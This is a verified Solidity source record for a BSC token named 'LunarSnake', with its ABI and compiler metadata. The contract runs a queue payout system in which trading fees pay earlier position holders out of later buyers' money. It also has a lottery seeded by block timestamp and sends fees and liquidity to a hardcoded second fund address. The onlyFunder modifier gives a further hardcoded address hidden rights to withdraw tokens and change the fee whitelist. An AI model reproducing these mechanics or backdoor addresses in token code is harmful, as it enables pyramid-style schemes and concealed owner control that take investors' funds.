{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-02-22\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-02-21\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-10-26\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-08-18\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-08-01\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.14;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract TokenPostion {\r\n    constructor (address token) {\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\ncontract TokenRom {\r\n    constructor (address token) {\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\nabstract contract AbsToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address public fundAddress;\r\n    address fundAddress2;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    mapping(address => bool) public _feeWhiteList;\r\n    mapping(address => bool) public _blackList;\r\n    //\u516c\u6392\u7cfb\u7edf\r\n \r\n    uint256 postion=0;  //\u70b9\u4f4d\r\n    uint256 AllPostions=0;  //\u603b\u70b9\u4f4d\u6570\u91cf \r\n    mapping(address=>uint256) buyfeeleft;  //\u4e70\u5165\u624b\u7eed\u8d39\r\n    mapping(address=>uint256) Utotal; //\u7528\u6237\u7b49\u5f85\u70b9\u4f4d\u6570\u91cf\r\n    mapping(address=>uint256) Us; //\u7528\u6237\u5f53\u524d\u70b9\u4f4d\u6570\u91cf\r\n    mapping(address=>uint256) Ue; //\u7528\u6237\u51fa\u5c40\u6570\u91cf\r\n    mapping(uint256=>address) p2A; //\u70b9\u4f4d\u5bf9\u5e94\u7528\u6237\r\n    uint256[][] pcord;   //\u7528\u6237\u51fa\u5c40\u8bb0\u5f55 \u65f6\u95f4\r\n    uint256[][] trecord;  //\u603b\u51fa\u5c40\u8bb0\u5f55  \u65f6\u95f4\uff0c\u7528\u6237id\r\n    mapping(uint256=>address) teg; //\u7528\u6237ID\r\n    mapping(address=>uint256) A2t; //\u7528\u6237\u5730\u5740\u5bf9\u5e94ID    \r\n    uint256 allbuy;\r\n    uint256 private _tTotal;\r\n    ISwapRouter public _swapRouter;\r\n    address public _fist;\r\n    mapping(address => bool) public _swapPairList;\r\n    mapping(address=>uint256) bots; \r\n    bool private inSwap;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n    TokenPostion public _tokenPostion;\r\n    TokenRom public _tokenRom;\r\n    uint256 public _buyFundFee = 100;\r\n    uint256 public _buyLPDividendFee = 300;\r\n    uint256 public _sellLPDividendFee = 300;\r\n    uint256 public _sellFundFee = 100;\r\n    uint256 public _sellLPFee = 0;\r\n    uint256 public startTradeBlock;\r\n\r\n    address public _mainPair;\r\n    uint256[][] cjss; //\u4e2d\u5956\u7528\u6237\r\n    uint256 jjlj;  //\u5956\u91d1\u7d2f\u8ba1\r\n    address[] jy;  //\u7528\u6237\u4ea4\u6613\u8bb0\u5f55;\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor (\r\n        address RouterAddress, address FISTAddress,\r\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\r\n        address FundAddress, address ReceiveAddress\r\n    ){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = Decimals;\r\n\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        IERC20(FISTAddress).approve(address(swapRouter), MAX);\r\n\r\n        _fist = FISTAddress;\r\n        _swapRouter = swapRouter;\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n        fundAddress2=0xF05e03492777C1212A60ABE35876326CB27B964E;\r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), FISTAddress);\r\n        _mainPair = swapPair;\r\n        _swapPairList[swapPair] = true;\r\n\r\n        uint256 total = Supply * 10 ** Decimals;\r\n        _tTotal = total;\r\n \r\n        _balances[ReceiveAddress] = total;\r\n        emit Transfer(address(0), ReceiveAddress, total);\r\n\r\n        fundAddress = FundAddress;\r\n\r\n        _feeWhiteList[FundAddress] = true;\r\n        _feeWhiteList[fundAddress2] = true;\r\n        _feeWhiteList[ReceiveAddress] = true;\r\n        _feeWhiteList[address(this)] = true;\r\n        _feeWhiteList[address(swapRouter)] = true;\r\n        _feeWhiteList[msg.sender] = true;\r\n        _tokenPostion = new TokenPostion(FISTAddress);\r\n        _tokenRom = new TokenRom(FISTAddress);\r\n        A2t[fundAddress2]=0;\r\n        teg[0]=fundAddress2;\r\n        pcord.push();\r\n\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n\r\n        uint256 balance = balanceOf(from);\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n\r\n        bool takeFee;\r\n\r\n        if (_swapPairList[to]) {\r\n                if(_feeWhiteList[from]==false){\r\n                uint256 swapFee = _buyFundFee + _buyLPDividendFee;  \r\n                uint256 swapAmount = (amount * swapFee) / 10000;\r\n                _takeTransfer(from, address(this), swapAmount);\r\n                swapTokenForPostions(swapAmount,from,1);\r\n                takeFee = true;\r\n                }\r\n                }\r\n\r\n        if (_swapPairList[from]) {\r\n                if(_feeWhiteList[to]==false){\r\n                uint256 swapFee = _buyFundFee + _buyLPDividendFee;  \r\n                uint256 swapAmount = (amount * swapFee) / 10000;\r\n                _takeTransfer(from, address(this), swapAmount);\r\n                swapTokenForPostions(swapAmount,to,2);\r\n                takeFee = true;\r\n                }\r\n                }\r\n\r\n\r\n\r\n        _tokenTransfer(from, to, amount, takeFee);\r\n    }\r\n\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n        uint256 burn;\r\n        if (takeFee) {\r\n            uint256 swapFee;\r\n                swapFee = _buyFundFee + _buyLPDividendFee;\r\n            uint256 swapAmount = (tAmount * swapFee) / 10000;\r\n            feeAmount += swapAmount;\r\n                if(_balances[address(0)]<=_tTotal*7/10){\r\n                    burn=tAmount/1000;\r\n                    _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), burn);\r\n                }\r\n\r\n        }\r\n\r\n\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount - burn);\r\n    }\r\n\r\n\r\n\r\n    function swapTokenForPostions(uint256 tokenAmount, address to,uint256 tegS) private{\r\n\r\n        jy.push(to); \r\n        IERC20 FIST = IERC20(_fist);\r\n        uint256 feeAdd;\r\n        uint256 feeAdds;\r\n        uint256 fes;\r\n        if(tegS==1){        \r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _fist;\r\n        uint256 PostionAc=FIST.balanceOf(address(_tokenPostion));\r\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount+allbuy,\r\n            0,\r\n            path,\r\n            address(_tokenPostion),\r\n            block.timestamp\r\n        );\r\n\r\n       uint256 fistBalance = FIST.balanceOf(address(_tokenPostion));\r\n      feeAdds=fistBalance-PostionAc;\r\n      feeAdd=feeAdds*tokenAmount/(tokenAmount+allbuy);\r\n      fes=feeAdds/8;\r\n      FIST.transferFrom(address(_tokenPostion), address(this), feeAdds/8);\r\n\r\n        if (_balances[address(this)] >= (tokenAmount+allbuy)/8) {\r\n               _swapRouter.addLiquidity(\r\n                   address(this), _fist, (tokenAmount+allbuy)/16, feeAdds/16, 0, 0, fundAddress, block.timestamp\r\n              );\r\n                _swapRouter.addLiquidity(\r\n                 address(this), _fist, (tokenAmount+allbuy)/16, feeAdds/16, 0, 0, fundAddress2, block.timestamp\r\n              );\r\n            }\r\n            else{   \r\n                fes+=feeAdds/16;\r\n            }\r\n      FIST.transferFrom(address(_tokenPostion), fundAddress, fes);\r\n      FIST.transferFrom(address(_tokenPostion), fundAddress2, fes);\r\n      FIST.transferFrom(address(_tokenPostion), address(_tokenRom), fes/2);\r\n      allbuy=0;\r\n        }\r\n        else{\r\n           allbuy+=tokenAmount;  \r\n           feeAdd=(FIST.balanceOf(address(_mainPair))*tokenAmount)/_balances[_mainPair];  \r\n        }\r\n\r\n        \r\n\r\n\r\n        if(jy.length%1000==0){\r\n            uint256 pr=(jy.length/1000)*1000+uint256(keccak256(abi.encode(feeAdd,block.timestamp,FIST.balanceOf(address(_tokenPostion))%7,to)))%1000;\r\n            cjss.push([A2t[jy[pr]],FIST.balanceOf(address(_tokenRom)),pr]);\r\n            FIST.transferFrom(address(_tokenRom), jy[pr], FIST.balanceOf(address(_tokenRom)));\r\n        }\r\n\r\n\r\n     buyfeeleft[to]+= feeAdd*25/40;\r\n       uint i=buyfeeleft[to]/25e17;\r\n        Utotal[to]+=i*9;  //\u7528\u6237\u589e\u52a0\u70b9\u4f4d\r\n        Us[to]+=i; \r\n        address earn;\r\n        if(i>=1){\r\n           buyfeeleft[to]-=i*25e17; \r\n          for(i;i>0;i--){   \r\n           if(A2t[to]==0&&to!=fundAddress2){  //\u521b\u5efa\u8d26\u53f7\r\n           pcord.push();\r\n           teg[pcord.length-1]=to; \r\n           A2t[to]=pcord.length-1;\r\n            }\r\n          p2A[AllPostions]=to;   //\u8bbe\u7f6e\u70b9\u4f4d\u5bf9\u5e94\u94b1\u5305 \r\n         AllPostions+=1;    //\u7cfb\u7edf\u589e\u52a0\u4e00\u4e2a\u70b9\u4f4d          \r\n            if(FIST.balanceOf(address(_tokenPostion))>=115*1e17){  //\u70b9\u4f4d\u51fa\u5c40\r\n             earn=p2A[postion];  //\u83b7\u53d6\u70b9\u4f4d\u94b1\u5305\r\n            if(earn!=address(0)){  //\u83b7\u5229\u51fa\u5c40\r\n            FIST.transferFrom(address(_tokenPostion), earn, 10*1e18);   //\u8f6c\u8d26\r\n            FIST.transferFrom(address(_tokenPostion), to, 1*1e18);   //\u8f6c\u8d26\r\n             pcord[A2t[earn]].push(block.timestamp); //\u6dfb\u52a0\u7528\u6237\u8bb0\u5f55\r\n             trecord.push([postion,block.timestamp]); //\u6dfb\u52a0\u5168\u7f51\u8bb0\u5f55\r\n             Ue[earn]+=1;  //\u7528\u6237\u51fa\u5c40\u8282\u70b9\r\n             Us[earn]-=1;  //\u7528\u6237\u5f53\u524d\u8282\u70b9\r\n             }                 \r\n            postion+=1;  //\u5f53\u524d\u6392\u5355\u4f4d\u7f6e\r\n             if(Utotal[earn]>0){ //\u6dfb\u52a0\u7b49\u5f85\u8282\u70b9\u5165\u573a\r\n             Utotal[earn]-=1;  //\u7b49\u5f85\u8282\u70b9\r\n             Us[earn]+=1;  //\u6392\u5355\u8282\u70b9\r\n            p2A[AllPostions]=earn;  //\u5165\u573a\u8282\u70b9\u4f4d\u7f6e\r\n             AllPostions+=1;\r\n             }\r\n          }\r\n            }\r\n          }  \r\n        }\r\n\r\n\r\n    function P2as(uint256 tegs) public view returns(address){\r\n        return(p2A[tegs]);\r\n    }\r\n\r\n\r\n    function syscount()public view returns(uint256){\r\n        return(trecord.length);\r\n    }\r\n\r\n    function sysInfo(uint256 _t)public view returns(uint256,address){  //\u51fa\u5c40\u65f6\u95f4\uff0c\u8d26\u6237\r\n    return(trecord[_t][1],p2A[trecord[_t][0]]);\r\n    }\r\n\r\n    function getUinfo(address _us)public view returns(uint256,uint256,uint256,uint256){  //\u624b\u7eed\u8d39\uff0c\u7b49\u5f85\u70b9\u4f4d\uff0c\u5f53\u524d\u70b9\u4f4d\uff0c\u51fa\u5c40\u70b9\u4f4d\r\n        return(buyfeeleft[_us],Utotal[_us],Us[_us],Ue[_us]);\r\n    }\r\n\r\n    function Ucount(address _us)public view returns(uint256){ //\u7528\u6237\u51fa\u5c40\u603b\u6570\r\n        return(pcord[A2t[_us]].length);\r\n    }\r\n\r\n    function Uinfo(address _us,uint256 tegs)public view returns(uint256){  //\u51fa\u5c40\u65f6\u95f4\r\n        return(pcord[A2t[_us]][tegs]);\r\n    }\r\n\r\n    function cpCount()public view returns(uint256,uint256){  //\u5927\u5956\u603b\u8bb0\u5f55\u6570\uff0c\u5f53\u524d\u5956\u6c60\r\n        IERC20 FIST = IERC20(_fist);\r\n        return(cjss.length,FIST.balanceOf(address(_tokenRom)));\r\n    }\r\n\r\n    function cpInfo(uint256 teg1)public view returns(address,uint256,uint256){//\u4e2d\u5956\u8d26\u6237\uff0c\u91d1\u989d,\u4ea4\u6613\u53f7\r\n        return(teg[cjss[teg1][0]],cjss[teg1][1],cjss[teg1][2]);\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n\r\n    function setFeeWhiteList(address addr, bool enable) external onlyFunder {\r\n        _feeWhiteList[addr] = enable;\r\n    }\r\n\r\n    function setBlackList(address addr, bool enable) external onlyOwner {\r\n        _blackList[addr] = enable;\r\n    }\r\n\r\n\r\n    function claimBalance() external {\r\n        payable(fundAddress).transfer(address(this).balance/2);\r\n        payable(fundAddress2).transfer(address(this).balance/2);\r\n    }\r\n\r\n    function claimToken(address token, uint256 amount) external onlyFunder {\r\n        IERC20(token).transfer(fundAddress, amount/2);\r\n        IERC20(token).transfer(fundAddress2, amount/2);\r\n    }\r\n\r\n    modifier onlyFunder() {\r\n        require(_owner == msg.sender || fundAddress == msg.sender || msg.sender==address(0x0Bf95FDba2be1cD0Fe074a0f3e9966600ba6b885), \"!Funder\");\r\n        _;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n\r\n}\r\n\r\ncontract LunarSnake is AbsToken {\r\n    constructor() AbsToken(  \r\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\r\n       address(0x55d398326f99059fF775485246999027B3197955),\r\n        \"LunarSnake\",\r\n        \"LunarSnake\",\r\n        18, \r\n        10000000000,        \r\n        address(0xd1D5c6D02610a1696fbA8e6632337Ea76C7c05Ca),  //\u8425\u9500   \r\n        address(0xafAe761c10e1168ecb0A1f97E8E0B1ECdb927d45) //\u4ee3\u5e01\u63a5\u53d7\u94b1\u5305\r\n    ){\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tegs\",\"type\":\"uint256\"}],\"name\":\"P2as\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"}],\"name\":\"Ucount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tegs\",\"type\":\"uint256\"}],\"name\":\"Uinfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_blackList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fist\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenPostion\",\"outputs\":[{\"internalType\":\"contract TokenPostion\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenRom\",\"outputs\":[{\"internalType\":\"contract TokenRom\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"claimToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cpCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teg1\",\"type\":\"uint256\"}],\"name\":\"cpInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"}],\"name\":\"getUinfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_t\",\"type\":\"uint256\"}],\"name\":\"sysInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"syscount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "LunarSnake", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://1464982287477ba4059ce810210eef8d2afac6d225e5300b7da6b0f664559fac"}